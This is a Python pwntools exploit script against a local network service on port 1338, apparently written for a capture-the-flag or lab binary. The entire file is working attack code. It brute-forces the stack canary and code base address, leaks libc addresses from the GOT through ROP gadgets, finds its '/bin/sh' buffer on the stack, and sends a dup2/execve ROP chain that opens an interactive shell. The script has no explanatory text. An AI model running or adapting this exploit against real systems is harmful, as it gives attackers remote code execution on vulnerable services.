from pwn import *
from struct import pack

port = 1338

canary = ""
rbp = ""
ret = ""
canary_offset = 56
guess = 0x0

buf = ""
buf += "A" * canary_offset
#buf += canary

rdi_gadget = 0x64b # pop rdi; ret;
rsi_gadget = 0x649 # pop rsi; pop r15; ret;
rdx_gadget = 0x265 # pop rdx; ret;

write_call = 0x54e
write_got = 0x050
got_offset = 0x2fd8


write_libc = ""
system_libc = ""
system_offset = 0xc0d00
dup2_offset =  0x860
dup2_libc = ""
execve_offset = 0x2b310
execve_libc = ""
stack_buffer = ""

def brute_canary(msg, host, port, rip):
    log.info("Brute force started...")
    context.log_level = "error" # ignore info. It would spam with "open connection" "connection closed"
    stack = ""
    value = 0x00
    eofe = 0
    while len(stack) < 8: # guess 8 bytes for a 64-bit program
        while value != 0xff: # guess values from 0-255
            while 1:
                try:
                    io = remote(host, port, level = 'error')
                    break
                except: # device busy exception, too many requests
                    print("[!] Connection attempt failed. New attempt in 1 second...")
                    time.sleep(1)

            io.clean()
            io.send(msg + stack + chr(value))
            response = ""
            eofe = 0
            try:
                response = io.recvuntil("Done", timeout = 5)
            except EOFError:
                print(hex(value))
                value += 1
                eofe = 1
                pass
            finally:
                io.shutdown()
                io.close()
            if "Done" in response: # correct guess
                stack += chr(value)
                print("[+] [%s] = %s" % (hexdump(stack), hex(value)))
                value = 0x00
                break
            else:
                if eofe == 0:
                    if(rip == 0):
                        print("New option: " + hex(value))
                        value += 1
                    else:
                        stack += chr(value)
                        print("[+] [%s] = %s" % (hexdump(stack), hex(value)))
                        value = 0x00
                        break
#	    print hex(value)

    context.log_level = "info" # enable info logging again
    stack = u64(stack)
    log.info("Stack value is %s" % hex(stack))
    return stack




def leakLibc():

# rdi_gadget = 0x64b # pop rdi; ret;
# rsi_gadget = 0x649 # pop rsi; pop r15; ret;
# rdx_gadget = 0x265 # pop rdx; ret;

# write_call = 0x54e
# write_got = 0x050
    
    buf = "A"*56
    buf += p64(canary)
    buf += p64(rbp)

    buf += p64(rip + rdx_gadget)
    buf += p64(0x8)
    buf += p64(rip + rsi_gadget)
    buf += p64(rip + write_got + got_offset)
    buf += p64(rbp)
    buf += p64(rip + write_call)


    try:
        io = remote("localhost", port, level = 'error')
    except: # device busy exception, too many requests
        print("[!] Connection attempt failed. New attempt in 1 second...")

    io.clean()
    io.send(buf)
    response = ""
    try:
        response = io.recvall()
    except EOFError:
        print "Error recieving!!!"
        pass
    finally:
        io.shutdown()
        io.close()

    
    recv = u64(response.splitlines()[-1])
    return recv




def leakStack(stf, bf):

# rdi_gadget = 0x64b # pop rdi; ret;
# rsi_gadget = 0x649 # pop rsi; pop r15; ret;
# rdx_gadget = 0x265 # pop rdx; ret;

# write_call = 0x54e
# write_got = 0x050
    
    buf = "A"*56
    buf += p64(canary)
    buf += p64(rbp)

    buf += p64(rip + rdx_gadget)
    buf += p64(0x78)

    if(stf == 1):
        buf += p64(rip + rsi_gadget)
        buf += p64(bf)
        buf += p64(rbp)

    buf += p64(rip + write_call)


    try:
        io = remote("localhost", port, level = 'error')
    except: # device busy exception, too many requests
        print("[!] Connection attempt failed. New attempt in 1 second...")

    io.clean()
    io.send(buf)
    response = ""
    try:
        response = io.recvall()
    except EOFError:
        print "Error recieving!!!"
        pass
    finally:
        io.shutdown()
        io.close()


    response = response[52:]


    n = 8
    words = [response[i:i+n] for i in range(0, len(response), n)]
    
    if(stf == 0):
        return u64(words[-1])
    else:
        return u64(words[0])

    for addr in words:
        print hex(u64(addr))





def triggerExploit():

# rdi_gadget = 0x64b # pop rdi; ret;
# rsi_gadget = 0x649 # pop rsi; pop r15; ret;
# rdx_gadget = 0x265 # pop rdx; ret;

# write_call = 0x54e
# write_got = 0x050
    
    buf = "/bin/sh\x00"
    buf += "A"*48
    buf += p64(canary)
    buf += p64(rbp)

    buf += p64(rip + rsi_gadget)
    buf += p64(0x0)
    buf += p64(0x0)
    buf += p64(dup2_libc)

    buf += p64(rip + rsi_gadget)
    buf += p64(0x1)
    buf += p64(0x0)
    buf += p64(dup2_libc)

    buf += p64(rip + rdi_gadget)
    buf += p64(stack_buffer)

    buf += p64(rip + rsi_gadget)
    buf += p64(0x0)
    buf += p64(0x0)

    buf += p64(rip + rdx_gadget)
    buf += p64(0x0)
    buf += p64(execve_libc)


    print buf.encode('hex')

    try:
        io = remote("localhost", port)
    except: # device busy exception, too many requests
        print("[!] Connection attempt failed. New attempt in 1 second...")

    io.clean()
    io.send(buf)
    io.interactive()





print "[*] Brute forcing canary value..."
# canary = brute_canary(buf, "localhost", port, 0)
canary = 0xf731b20ca72c3000
print "   + canary restored: " + hex(canary)

rbp = 0x4141414141414141 #0x7ffe0f7e6430


print "[*] Brute forcing code section..."
# rip = brute_canary(buf + p64(canary) + p64(rbp), "localhost", port, 1)
# print "RIP = " + hex(rip)
rip = 0x560a74d5c558
rip = int(hex(rip)[:-3]+"000", 16)
print "   + code section at: " + hex(rip)


print "[*] Leaking got and calculating offsets..."
write_libc = leakLibc()
system_libc = write_libc - system_offset
execve_libc = write_libc - execve_offset
dup2_libc = write_libc + dup2_offset
print "   + Libc write loaded at: " + hex(write_libc)
print "   + Libc system loaded at: " + hex(system_libc)
print "   + Libc dup2 loaded at: " + hex(dup2_libc)
print "   + Libc execve loaded at: " + hex(execve_libc)


print "[*] Looking for a stack leak..."
stack_addr = leakStack(0, 0)
print "   + stack found at: " + hex(stack_addr)

for gr in range(256, 0, -8):
    rs = stack_addr - gr
    leak = leakStack(1, rs)
    if(hex(leak) == "0x4141414141414141"):
        stack_buffer = rs
        print "   + user buffer found at: " + hex(stack_buffer)
        break;

triggerExploit()


sys.exit()




